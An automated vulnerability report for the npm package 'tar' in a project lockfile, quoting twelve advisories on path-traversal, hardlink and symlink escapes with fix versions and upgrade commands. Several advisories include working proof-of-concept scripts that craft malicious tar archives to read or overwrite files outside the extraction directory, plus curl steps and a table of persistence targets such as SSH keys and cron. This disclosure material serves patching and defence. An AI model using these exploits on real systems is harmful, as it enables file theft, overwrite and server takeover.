# tar - Vulnerability Details

**Package to Upgrade:** `tar`

**Total Vulnerabilities:** 12

**Severity Breakdown:** 0 Critical, 11 High, 1 Medium, 0 Low

## Affected Lockfiles

- `./grocery-infra/package-lock.json`

## Summary

These vulnerabilities are in transitive dependencies. Upgrade `tar` in package.json to fix them.

## Vulnerabilities

### tar

**Vulnerable Package:** `tar`

**CVE Count:** 12

#### GHSA-34x7-hfp2-rc4v

**Severity:** HIGH

**CVSS Score:** 7.5

**Dependency Chain:** grocery-infra → tar

**Summary:** node-tar Vulnerable to Arbitrary File Creation/Overwrite via Hardlink Path Traversal

**Details:** ### Summary
node-tar contains a vulnerability where the security check for hardlink entries uses different path resolution semantics than the actual hardlink creation logic. This mismatch allows an attacker to craft a malicious TAR archive that bypasses path traversal protections and creates hardlinks to arbitrary files outside the extraction directory.

### Details
The vulnerability exists in `lib/unpack.js`. When extracting a hardlink, two functions handle the linkpath differently:

**Security check in `[STRIPABSOLUTEPATH]`:**
```javascript
const entryDir = path.posix.dirname(entry.path);
const resolved = path.posix.normalize(path.posix.join(entryDir, linkpath));
if (resolved.startsWith('../')) { /* block */ }
```

**Hardlink creation in `[HARDLINK]`:**
```javascript
const linkpath = path.resolve(this.cwd, entry.linkpath);
fs.linkSync(linkpath, dest);
```

**Example:** An application extracts a TAR using `tar.extract({ cwd: '/var/app/uploads/' })`. The TAR contains entry `a/b/c/d/x` as a hardlink to `../../../../etc/passwd`.

- **Security check** resolves the linkpath relative to the entry's parent directory: `a/b/c/d/ + ../../../../etc/passwd` = `etc/passwd`. No `../` prefix, so it **passes**.

- **Hardlink creation** resolves the linkpath relative to the extraction directory (`this.cwd`): `/var/app/uploads/ + ../../../../etc/passwd` = `/etc/passwd`. This **escapes** to the system's `/etc/passwd`.

The security check and hardlink creation use different starting points (entry directory `a/b/c/d/` vs extraction directory `/var/app/uploads/`), so the same linkpath can pass validation but still escape. The deeper the entry path, the more levels an attacker can escape.

### PoC
#### Setup

Create a new directory with these files:

```
poc/
├── package.json
├── secret.txt          ← sensitive file (target)
├── server.js           ← vulnerable server
├── create-malicious-tar.js
├── verify.js
└── uploads/            ← created automatically by server.js
    └── (extracted files go here)
```

**package.json**
```json
{ "dependencies": { "tar": "^7.5.0" } }
```

**secret.txt** (sensitive file outside uploads/)
```
DATABASE_PASSWORD=supersecret123
```

**server.js** (vulnerable file upload server)
```javascript
const http = require('http');
const fs = require('fs');
const path = require('path');
const tar = require('tar');

const PORT = 3000;
const UPLOAD_DIR = path.join(__dirname, 'uploads');
fs.mkdirSync(UPLOAD_DIR, { recursive: true });

http.createServer((req, res) => {
  if (req.method === 'POST' && req.url === '/upload') {
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', async () => {
      fs.writeFileSync(path.join(UPLOAD_DIR, 'upload.tar'), Buffer.concat(chunks));
      await tar.extract({ file: path.join(UPLOAD_DIR, 'upload.tar'), cwd: UPLOAD_DIR });
      res.end('Extracted\n');
    });
  } else if (req.method === 'GET' && req.url === '/read') {
    // Simulates app serving extracted files (e.g., file download, static assets)
    const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
    if (fs.existsSync(targetPath)) {
      res.end(fs.readFileSync(targetPath));
    } else {
      res.end('File not found\n');
    }
  } else if (req.method === 'POST' && req.url === '/write') {
    // Simulates app writing to extracted file (e.g., config update, log append)
    const chunks = [];
    req.on('data', c => chunks.push(c));
    req.on('end', () => {
      const targetPath = path.join(UPLOAD_DIR, 'd', 'x');
      if (fs.existsSync(targetPath)) {
        fs.writeFileSync(targetPath, Buffer.concat(chunks));
        res.end('Written\n');
      } else {
        res.end('File not found\n');
      }
    });
  } else {
    res.end('POST /upload, GET /read, or POST /write\n');
  }
}).listen(PORT, () => console.log(`http://localhost:${PORT}`));
```

**create-malicious-tar.js** (attacker creates exploit TAR)
```javascript
const fs = require('fs');

function tarHeader(name, type, linkpath = '', size = 0) {
  const b = Buffer.alloc(512, 0);
  b.write(name, 0); b.write('0000644', 100); b.write('0000000', 108);
  b.write('0000000', 116); b.write(size.toString(8).padStart(11, '0'), 124);
  b.write(Math.floor(Date.now()/1000).toString(8).padStart(11, '0'), 136);
  b.write('        ', 148);
  b[156] = type === 'dir' ? 53 : type === 'link' ? 49 : 48;
  if (linkpath) b.write(linkpath, 157);
  b.write('ustar\x00', 257); b.write('00', 263);
  let sum = 0; for (let i = 0; i < 512; i++) sum += b[i];
  b.write(sum.toString(8).padStart(6, '0') + '\x00 ', 148);
  return b;
}

// Hardlink escapes to parent directory's secret.txt
fs.writeFileSync('malicious.tar', Buffer.concat([
  tarHeader('d/', 'dir'),
  tarHeader('d/x', 'link', '../secret.txt'),
  Buffer.alloc(1024)
]));
console.log('Created malicious.tar');
```

#### Run

```bash
# Setup
npm install
echo "DATABASE_PASSWORD=supersecret123" > secret.txt

# Terminal 1: Start server
node server.js

# Terminal 2: Execute attack
node create-malicious-tar.js
curl -X POST --data-binary @malicious.tar http://localhost:3000/upload

# READ ATTACK: Steal secret.txt content via the hardlink
curl http://localhost:3000/read
# Returns: DATABASE_PASSWORD=supersecret123

# WRITE ATTACK: Overwrite secret.txt through the hardlink
curl -X POST -d "PWNED" http://localhost:3000/write

# Confirm secret.txt was modified
cat secret.txt
```
### Impact

An attacker can craft a malicious TAR archive that, when extracted by an application using node-tar, creates hardlinks that escape the extraction directory. This enables:

**Immediate (Read Attack):** If the application serves extracted files, attacker can read any file readable by the process.

**Conditional (Write Attack):** If the application later writes to the hardlink path, it modifies the target file outside the extraction directory.

### Remote Code Execution / Server Takeover

| Attack Vector | Target File | Result |
|--------------|-------------|--------|
| SSH Access | `~/.ssh/authorized_keys` | Direct shell access to server |
| Cron Backdoor | `/etc/cron.d/*`, `~/.crontab` | Persistent code execution |
| Shell RC Files | `~/.bashrc`, `~/.profile` | Code execution on user login |
| Web App Backdoor | Application `.js`, `.php`, `.py` files | Immediate RCE via web requests |
| Systemd Services | `/etc/systemd/system/*.service` | Code execution on service restart |
| User Creation | `/etc/passwd` (if running as root) | Add new privileged user |

## Data Exfiltration & Corruption

1. **Overwrite arbitrary files** via hardlink escape + subsequent write operations
2. **Read sensitive files** by creating hardlinks that point outside extraction directory
3. **Corrupt databases** and application state
4. **Steal credentials** from config files, `.env`, secrets

**Fixed In:** 7.5.7

**Direct Upgrade:** `npm install tar@7.5.7` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

#### GHSA-3jfq-g458-7qm9

**Severity:** HIGH

**CVSS Score:** 9.0

**Dependency Chain:** grocery-infra → tar

**Summary:** Arbitrary File Creation/Overwrite due to insufficient absolute path sanitization

**Details:** ### Impact

Arbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution

`node-tar` aims to prevent extraction of absolute file paths by turning absolute paths into relative paths when the `preservePaths` flag is not set to `true`. This is achieved by stripping the absolute path root from any absolute file paths contained in a tar file. For example `/home/user/.bashrc` would turn into `home/user/.bashrc`. 

This logic was insufficient when file paths contained repeated path roots such as `////home/user/.bashrc`. `node-tar` would only strip a single path root from such paths. When given an absolute file path with repeating path roots, the resulting path (e.g. `///home/user/.bashrc`) would still resolve to an absolute path, thus allowing arbitrary file creation and overwrite. 

### Patches

3.2.2 || 4.4.14 || 5.0.6 || 6.1.1

NOTE: an adjacent issue [CVE-2021-32803](https://github.com/npm/node-tar/security/advisories/GHSA-r628-mhmh-qjhw) affects this release level. Please ensure you update to the latest patch levels that address CVE-2021-32803 as well if this adjacent issue affects your `node-tar` use case.

### Workarounds

Users may work around this vulnerability without upgrading by creating a custom `onentry` method which sanitizes the `entry.path` or a `filter` method which removes entries with absolute paths.

```js
const path = require('path')
const tar = require('tar')

tar.x({
  file: 'archive.tgz',
  // either add this function...
  onentry: (entry) => {
    if (path.isAbsolute(entry.path)) {
      entry.path = sanitizeAbsolutePathSomehow(entry.path)
      entry.absolute = path.resolve(entry.path)
    }
  },

  // or this one
  filter: (file, entry) => {
    if (path.isAbsolute(entry.path)) {
      return false
    } else {
      return true
    }
  }
})
```

Users are encouraged to upgrade to the latest patch versions, rather than attempt to sanitize tar input themselves.

**Fixed In:** 3.2.2, 4.4.14, 5.0.6

**Direct Upgrade:** `npm install tar@3.2.2` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

#### GHSA-5955-9wpr-37jh

**Severity:** HIGH

**CVSS Score:** 9.0

**Dependency Chain:** grocery-infra → tar

**Summary:** Arbitrary File Creation/Overwrite on Windows via insufficient relative path sanitization

**Details:** ### Impact

Arbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution

node-tar aims to guarantee that any file whose location would be outside of the extraction target directory is not extracted. This is, in part, accomplished by sanitizing absolute paths of entries within the archive, skipping archive entries that contain `..` path portions, and resolving the sanitized paths against the extraction target directory.

This logic was insufficient on Windows systems when extracting tar files that contained a path that was not an absolute path, but specified a drive letter different from the extraction target, such as `C:some\path`.  If the drive letter does not match the extraction target, for example `D:\extraction\dir`, then the result of `path.resolve(extractionDirectory, entryPath)` would resolve against the current working directory on the `C:` drive, rather than the extraction target directory.

Additionally, a `..` portion of the path could occur immediately after the drive letter, such as `C:../foo`, and was not properly sanitized by the logic that checked for `..` within the normalized and split portions of the path.

This only affects users of `node-tar` on Windows systems.

### Patches

4.4.18 || 5.0.10 || 6.1.9

### Workarounds

There is no reasonable way to work around this issue without performing the same path normalization procedures that node-tar now does.

Users are encouraged to upgrade to the latest patched versions of node-tar, rather than attempt to sanitize paths themselves.

### Fix

The fixed versions strip path roots from all paths prior to being resolved against the extraction target folder, even if such paths are not "absolute".

Additionally, a path starting with a drive letter and then two dots, like `c:../`, would bypass the check for `..` path portions.  This is checked properly in the patched versions.

Finally, a defense in depth check is added, such that if the `entry.absolute` is outside of the extraction taret, and we are not in preservePaths:true mode, a warning is raised on that entry, and it is skipped.  Currently, it is believed that this check is redundant, but it did catch some oversights in development.


**Fixed In:** 4.4.18, 5.0.10, 6.1.9

**Direct Upgrade:** `npm install tar@4.4.18` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

#### GHSA-83g3-92jg-28cx

**Severity:** HIGH

**CVSS Score:** 9.0

**Dependency Chain:** grocery-infra → tar

**Summary:** Arbitrary File Read/Write via Hardlink Target Escape Through Symlink Chain in node-tar Extraction

**Details:** ### Summary
`tar.extract()` in Node `tar` allows an attacker-controlled archive to create a hardlink inside the extraction directory that points to a file outside the extraction root, using default options.

This enables **arbitrary file read and write** as the extracting user (no root, no chmod, no `preservePaths`).

Severity is high because the primitive bypasses path protections and turns archive extraction into a direct filesystem access primitive.

### Details
The bypass chain uses two symlinks plus one hardlink:

1. `a/b/c/up -> ../..`
2. `a/b/escape -> c/up/../..`
3. `exfil` (hardlink) -> `a/b/escape/<target-relative-to-parent-of-extract>`

Why this works:

- Linkpath checks are string-based and do not resolve symlinks on disk for hardlink target safety.
  - See `STRIPABSOLUTEPATH` logic in:
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:255`
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:268`
    - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:281`

- Hardlink extraction resolves target as `path.resolve(cwd, entry.linkpath)` and then calls `fs.link(target, destination)`.
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:566`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:567`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:703`

- Parent directory safety checks (`mkdir` + symlink detection) are applied to the destination path of the extracted entry, not to the resolved hardlink target path.
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:617`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/unpack.js:619`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:27`
  - `../tar-audit-setuid - CVE/node_modules/tar/dist/commonjs/mkdir.js:101`

As a result, `exfil` is created inside extraction root but linked to an external file. The PoC confirms shared inode and successful read+write via `exfil`.

### PoC
[hardlink.js](https://github.com/user-attachments/files/25240082/hardlink.js)
Environment used for validation:

- Node: `v25.4.0`
- tar: `7.5.7`
- OS: macOS Darwin 25.2.0
- Extract options: defaults (`tar.extract({ file, cwd })`)

Steps:

1. Prepare/locate a `tar` module. If `require('tar')` is not available locally, set `TAR_MODULE` to an absolute path to a tar package directory.

2. Run:

```bash
TAR_MODULE="$(cd '../tar-audit-setuid - CVE/node_modules/tar' && pwd)" node hardlink.js
```

3. Expected vulnerable output (key lines):

```text
same_inode=true
read_ok=true
write_ok=true
result=VULNERABLE
```

Interpretation:

- `same_inode=true`: extracted `exfil` and external secret are the same file object.
- `read_ok=true`: reading `exfil` leaks external content.
- `write_ok=true`: writing `exfil` modifies external file.

### Impact
Vulnerability type:

- Arbitrary file read/write via archive extraction path confusion and link resolution.

Who is impacted:

- Any application/service that extracts attacker-controlled tar archives with Node `tar` defaults.
- Impact scope is the privileges of the extracting process user.

Potential outcomes:

- Read sensitive files reachable by the process user.
- Overwrite writable files outside extraction root.
- Escalate impact depending on deployment context (keys, configs, scripts, app data).

**Fixed In:** 7.5.8

**Direct Upgrade:** `npm install tar@7.5.8` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

#### GHSA-8qq5-rm4j-mr97

**Severity:** HIGH

**CVSS Score:** 7.5

**Dependency Chain:** grocery-infra → tar

**Summary:** node-tar is Vulnerable to Arbitrary File Overwrite and Symlink Poisoning via Insufficient Path Sanitization

**Details:** ### Summary

The `node-tar` library (`<= 7.5.2`) fails to sanitize the `linkpath` of `Link` (hardlink) and `SymbolicLink` entries when `preservePaths` is false (the default secure behavior). This allows malicious archives to bypass the extraction root restriction, leading to **Arbitrary File Overwrite** via hardlinks and **Symlink Poisoning** via absolute symlink targets.

### Details

The vulnerability exists in `src/unpack.ts` within the `[HARDLINK]` and `[SYMLINK]` methods.

**1. Hardlink Escape (Arbitrary File Overwrite)**

The extraction logic uses `path.resolve(this.cwd, entry.linkpath)` to determine the hardlink target. Standard Node.js behavior dictates that if the second argument (`entry.linkpath`) is an **absolute path**, `path.resolve` ignores the first argument (`this.cwd`) entirely and returns the absolute path.

The library fails to validate that this resolved target remains within the extraction root. A malicious archive can create a hardlink to a sensitive file on the host (e.g., `/etc/passwd`) and subsequently write to it, if file permissions allow writing to the target file, bypassing path-based security measures that may be in place.

**2. Symlink Poisoning**

The extraction logic passes the user-supplied `entry.linkpath` directly to `fs.symlink` without validation. This allows the creation of symbolic links pointing to sensitive absolute system paths or traversing paths (`../../`), even when secure extraction defaults are used.

### PoC

The following script generates a binary TAR archive containing malicious headers (a hardlink to a local file and a symlink to `/etc/passwd`). It then extracts the archive using standard `node-tar` settings and demonstrates the vulnerability by verifying that the local "secret" file was successfully overwritten.

```javascript
const fs = require('fs')
const path = require('path')
const tar = require('tar')

const out = path.resolve('out_repro')
const secret = path.resolve('secret.txt')
const tarFile = path.resolve('exploit.tar')
const targetSym = '/etc/passwd'

// Cleanup & Setup
try { fs.rmSync(out, {recursive:true, force:true}); fs.unlinkSync(secret) } catch {}
fs.mkdirSync(out)
fs.writeFileSync(secret, 'ORIGINAL_DATA')

// 1. Craft malicious Link header (Hardlink to absolute local file)
const h1 = new tar.Header({
  path: 'exploit_hard',
  type: 'Link',
  size: 0,
  linkpath: secret 
})
h1.encode()

// 2. Craft malicious Symlink header (Symlink to /etc/passwd)
const h2 = new tar.Header({
  path: 'exploit_sym',
  type: 'SymbolicLink',
  size: 0,
  linkpath: targetSym 
})
h2.encode()

// Write binary tar
fs.writeFileSync(tarFile, Buffer.concat([ h1.block, h2.block, Buffer.alloc(1024) ]))

console.log('[*] Extracting malicious tarball...')

// 3. Extract with default secure settings
tar.x({
  cwd: out,
  file: tarFile,
  preservePaths: false
}).then(() => {
  console.log('[*] Verifying payload...')

  // Test Hardlink Overwrite
  try {
    fs.writeFileSync(path.join(out, 'exploit_hard'), 'OVERWRITTEN')
    
    if (fs.readFileSync(secret, 'utf8') === 'OVERWRITTEN') {
      console.log('[+] VULN CONFIRMED: Hardlink overwrite successful')
    } else {
      console.log('[-] Hardlink failed')
    }
  } catch (e) {}

  // Test Symlink Poisoning
  try {
    if (fs.readlinkSync(path.join(out, 'exploit_sym')) === targetSym) {
      console.log('[+] VULN CONFIRMED: Symlink points to absolute path')
    } else {
      console.log('[-] Symlink failed')
    }
  } catch (e) {}
})

```

### Impact

* **Arbitrary File Overwrite:** An attacker can overwrite any file the extraction process has access to, bypassing path-based security restrictions. It does not grant write access to files that the extraction process does not otherwise have access to, such as root-owned configuration files.
* **Remote Code Execution (RCE):** In CI/CD environments or automated pipelines, overwriting configuration files, scripts, or binaries leads to code execution. (However, npm is unaffected, as it filters out all `Link` and `SymbolicLink` tar entries from extracted packages.)

**Fixed In:** 7.5.3

**Direct Upgrade:** `npm install tar@7.5.3` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

#### GHSA-9ppj-qmqm-q256

**Severity:** HIGH

**CVSS Score:** 7.5

**Dependency Chain:** grocery-infra → tar

**Summary:** node-tar Symlink Path Traversal via Drive-Relative Linkpath

**Details:** ### Summary
`tar` (npm) can be tricked into creating a symlink that points outside the extraction directory by using a drive-relative symlink target such as `C:../../../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details
The extraction logic in `Unpack[STRIPABSOLUTEPATH]` validates `..` segments against a resolved path that still uses the original drive-relative value, and only afterwards rewrites the stored `linkpath` to the stripped value.

What happens with `linkpath: "C:../../../target.txt"`:
1. `stripAbsolutePath()` removes `C:` and rewrites the value to `../../../target.txt`.
2. The escape check resolves using the original pre-stripped value, so it is treated as in-bounds and accepted.
3. Symlink creation uses the rewritten value (`../../../target.txt`) from nested path `a/b/l`.
4. Writing through the extracted symlink overwrites the outside file (`../target.txt`).

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC
Tested on Arch Linux with `tar@7.5.10`.

PoC script (`poc.cjs`):

```js
const fs = require('fs')
const path = require('path')
const { Header, x } = require('tar')

const cwd = process.cwd()
const target = path.resolve(cwd, '..', 'target.txt')
const tarFile = path.join(cwd, 'poc.tar')

fs.writeFileSync(target, 'ORIGINAL\n')

const b = Buffer.alloc(1536)
new Header({
  path: 'a/b/l',
  type: 'SymbolicLink',
  linkpath: 'C:../../../target.txt',
}).encode(b, 0)
fs.writeFileSync(tarFile, b)

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'a/b/l'), 'PWNED\n')
  process.stdout.write(fs.readFileSync(target, 'utf8'))
})
```

Run:

```bash
node poc.cjs && readlink a/b/l && ls -l a/b/l ../target.txt
```

Observed output:

```text
PWNED
../../../target.txt
lrwxrwxrwx - joshuavr  7 Mar 18:37 󰡯 a/b/l -> ../../../target.txt
.rw-r--r-- 6 joshuavr  7 Mar 18:37  ../target.txt
```

`PWNED` confirms outside file content overwrite. `readlink` and `ls -l` confirm the extracted symlink points outside the extraction directory.

### Impact
This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:
- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files

**Fixed In:** 7.5.11

**Direct Upgrade:** `npm install tar@7.5.11` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

#### GHSA-9r2w-394v-53qc

**Severity:** HIGH

**CVSS Score:** 9.0

**Dependency Chain:** grocery-infra → tar

**Summary:** Arbitrary File Creation/Overwrite via insufficient symlink protection due to directory cache poisoning using symbolic links

**Details:** ### Impact

Arbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution

`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.

This logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory, where the symlink and directory names in the archive entry used backslashes as a path separator on posix systems. The cache checking logic used both `\` and `/` characters as path separators, however `\` is a valid filename character on posix systems.

By first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.

Additionally, a similar confusion could arise on case-insensitive filesystems.  If a tar archive contained a directory at `FOO`, followed by a symbolic link named `foo`, then on case-insensitive file systems, the creation of the symbolic link would remove the directory from the filesystem, but _not_ from the internal directory cache, as it would not be treated as a cache hit.  A subsequent file entry within the `FOO` directory would then be placed in the target of the symbolic link, thinking that the directory had already been created. 

These issues were addressed in releases 4.4.16, 5.0.8 and 6.1.7.

The v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.

### Patches

4.4.16 || 5.0.8 || 6.1.7

### Workarounds

Users may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.

```js
const tar = require('tar')

tar.x({
  file: 'archive.tgz',
  filter: (file, entry) => {
    if (entry.type === 'SymbolicLink') {
      return false
    } else {
      return true
    }
  }
})
```

Users are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.

### Fix

The problem is addressed in the following ways:

1. All paths are normalized to use `/` as a path separator, replacing `\` with `/` on Windows systems, and leaving `\` intact in the path on posix systems.  This is performed in depth, at every level of the program where paths are consumed.
2. Directory cache pruning is performed case-insensitively.  This _may_ result in undue cache misses on case-sensitive file systems, but the performance impact is negligible.

#### Caveat

Note that this means that the `entry` objects exposed in various parts of tar's API will now always use `/` as a path separator, even on Windows systems.  This is not expected to cause problems, as `/` is a valid path separator on Windows systems, but _may_ result in issues if `entry.path` is compared against a path string coming from some other API such as `fs.realpath()` or `path.resolve()`.

Users are encouraged to always normalize paths using a well-tested method such as `path.resolve()` before comparing paths to one another.

**Fixed In:** 4.4.16, 5.0.8, 6.1.7

**Direct Upgrade:** `npm install tar@4.4.16` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

#### GHSA-qffp-2rhf-9h96

**Severity:** HIGH

**CVSS Score:** 7.5

**Dependency Chain:** grocery-infra → tar

**Summary:** tar has Hardlink Path Traversal via Drive-Relative Linkpath

**Details:** ### Summary
`tar` (npm) can be tricked into creating a hardlink that points outside the extraction directory by using a drive-relative link target such as `C:../target.txt`, which enables file overwrite outside `cwd` during normal `tar.x()` extraction.

### Details
The extraction logic in `Unpack[STRIPABSOLUTEPATH]` checks for `..` segments *before* stripping absolute roots.

What happens with `linkpath: "C:../target.txt"`:
1. Split on `/` gives `['C:..', 'target.txt']`, so `parts.includes('..')` is false.
2. `stripAbsolutePath()` removes `C:` and rewrites the value to `../target.txt`.
3. Hardlink creation resolves this against extraction `cwd` and escapes one directory up.
4. Writing through the extracted hardlink overwrites the outside file.

This is reachable in standard usage (`tar.x({ cwd, file })`) when extracting attacker-controlled tar archives.

### PoC
Tested on Arch Linux with `tar@7.5.9`.

PoC script (`poc.cjs`):

```js
const fs = require('fs')
const path = require('path')
const { Header, x } = require('tar')

const cwd = process.cwd()
const target = path.resolve(cwd, '..', 'target.txt')
const tarFile = path.join(process.cwd(), 'poc.tar')

fs.writeFileSync(target, 'ORIGINAL\n')

const b = Buffer.alloc(1536)
new Header({ path: 'l', type: 'Link', linkpath: 'C:../target.txt' }).encode(b, 0)
fs.writeFileSync(tarFile, b)

x({ cwd, file: tarFile }).then(() => {
  fs.writeFileSync(path.join(cwd, 'l'), 'PWNED\n')
  process.stdout.write(fs.readFileSync(target, 'utf8'))
})
```

Run:

```bash
cd test-workspace
node poc.cjs && ls -l ../target.txt
```

Observed output:

```text
PWNED
-rw-r--r-- 2 joshuavr joshuavr 6 Mar  4 19:25 ../target.txt
```

`PWNED` confirms outside file content overwrite. Link count `2` confirms the extracted file and `../target.txt` are hardlinked.

### Impact
This is an arbitrary file overwrite primitive outside the intended extraction root, with the permissions of the process performing extraction.

Realistic scenarios:
- CLI tools unpacking untrusted tarballs into a working directory
- build/update pipelines consuming third-party archives
- services that import user-supplied tar files

**Fixed In:** 7.5.10

**Direct Upgrade:** `npm install tar@7.5.10` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

#### GHSA-qq89-hq3f-393p

**Severity:** HIGH

**CVSS Score:** 9.0

**Dependency Chain:** grocery-infra → tar

**Summary:** Arbitrary File Creation/Overwrite via insufficient symlink protection due to directory cache poisoning using symbolic links

**Details:** ### Impact
Arbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution

node-tar aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.

This logic was insufficient when extracting tar files that contained two directories and a symlink with names containing unicode values that normalized to the same value. Additionally, on Windows systems, long path portions would resolve to the same file system entities as their 8.3 "short path" counterparts. A specially crafted tar archive could thus include directories with two forms of the path that resolve to the same file system entity, followed by a symbolic link with a name in the first form, lastly followed by a file using the second form. It led to bypassing node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.

The v3 branch of `node-tar` has been deprecated and did not receive patches for these issues. If you are still using a v3 release we recommend you update to a more recent version of `node-tar`. If this is not possible, a workaround is available below.

### Patches

6.1.9 || 5.0.10 || 4.4.18

### Workarounds

Users may work around this vulnerability without upgrading by creating a custom filter method which prevents the extraction of symbolic links.

```js
const tar = require('tar')

tar.x({
  file: 'archive.tgz',
  filter: (file, entry) => {
    if (entry.type === 'SymbolicLink') {
      return false
    } else {
      return true
    }
  }
})
```

Users are encouraged to upgrade to the latest patched versions, rather than attempt to sanitize tar input themselves.

#### Fix

The problem is addressed in the following ways, when comparing paths in the directory cache and path reservation systems:

1. The `String.normalize('NFKD')` method is used to first normalize all unicode to its maximally compatible and multi-code-point form.
2. All slashes are normalized to `/` on Windows systems (on posix systems, `\` is a valid filename character, and thus left intact).
3. When a symbolic link is encountered on Windows systems, the entire directory cache is cleared.  Collisions related to use of 8.3 short names to replace directories with other (non-symlink) types of entries may make archives fail to extract properly, but will not result in arbitrary file writes.


**Fixed In:** 4.4.18, 5.0.10, 6.1.9

**Direct Upgrade:** `npm install tar@4.4.18` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

#### GHSA-r628-mhmh-qjhw

**Severity:** HIGH

**CVSS Score:** 9.0

**Dependency Chain:** grocery-infra → tar

**Summary:** Arbitrary File Creation/Overwrite via insufficient symlink protection due to directory cache poisoning

**Details:** ### Impact

Arbitrary File Creation, Arbitrary File Overwrite, Arbitrary Code Execution

`node-tar` aims to guarantee that any file whose location would be modified by a symbolic link is not extracted. This is, in part, achieved by ensuring that extracted directories are not symlinks.  Additionally, in order to prevent unnecessary `stat` calls to determine whether a given path is a directory, paths are cached when directories are created.

This logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory. This order of operations resulted in the directory being created and added to the `node-tar` directory cache. When a directory is present in the directory cache, subsequent calls to mkdir for that directory are skipped. However, this is also where `node-tar` checks for symlinks occur.

By first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass `node-tar` symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.

This issue was addressed in releases 3.2.3, 4.4.15, 5.0.7 and 6.1.2.

### Patches

3.2.3 || 4.4.15 || 5.0.7 || 6.1.2

### Workarounds

Users may work around this vulnerability without upgrading by creating a custom `filter` method which prevents the extraction of symbolic links.

```js
const tar = require('tar')

tar.x({
  file: 'archive.tgz',
  filter: (file, entry) => {
    if (entry.type === 'SymbolicLink') {
      return false
    } else {
      return true
    }
  }
})
```

Users are encouraged to upgrade to the latest patch versions, rather than attempt to sanitize tar input themselves.

**Fixed In:** 3.2.3, 4.4.15, 5.0.7

**Direct Upgrade:** `npm install tar@3.2.3` (adds as direct dependency)

**Suggested Fix:** npm install tar@latest (upgrade parent)

---

#### GHSA-r6q2-hw4h-h46w

**Severity:** HIGH

**CVSS Score:** 7.5

**Dependency Chain:** grocery-infra → tar

**Summary:** Race Condition in node-tar Path Reservations via Unicode Ligature Collisions on macOS APFS

**Details:** **TITLE**: Race Condition in node-tar Path Reservations via Unicode Sharp-S (ß) Collisions on macOS APFS

**AUTHOR**: Tomás Illuminati

### Details

A race condition vulnerability exists in `node-tar` (v7.5.3) this is to an incomplete handling of Unicode path collisions in the `path-reservations` system. On case-insensitive or normalization-insensitive filesystems (such as macOS APFS, In which it has been tested), the library fails to lock colliding paths (e.g., `ß` and `ss`), allowing them to be processed in parallel. This bypasses the library's internal concurrency safeguards and permits Symlink Poisoning attacks via race conditions. The library uses a `PathReservations` system to ensure that metadata checks and file operations for the same path are serialized. This prevents race conditions where one entry might clobber another concurrently.

```typescript
// node-tar/src/path-reservations.ts (Lines 53-62)
reserve(paths: string[], fn: Handler) {
    paths =
      isWindows ?
        ['win32 parallelization disabled']
      : paths.map(p => {
          return stripTrailingSlashes(
            join(normalizeUnicode(p)), // <- THE PROBLEM FOR MacOS FS
          ).toLowerCase()
        })

```

In MacOS the ```join(normalizeUnicode(p)), ``` FS confuses ß with ss, but this code does not. For example:

``````bash
bash-3.2$ printf "CONTENT_SS\n" > collision_test_ss
bash-3.2$ ls
collision_test_ss
bash-3.2$ printf "CONTENT_ESSZETT\n" > collision_test_ß
bash-3.2$ ls -la
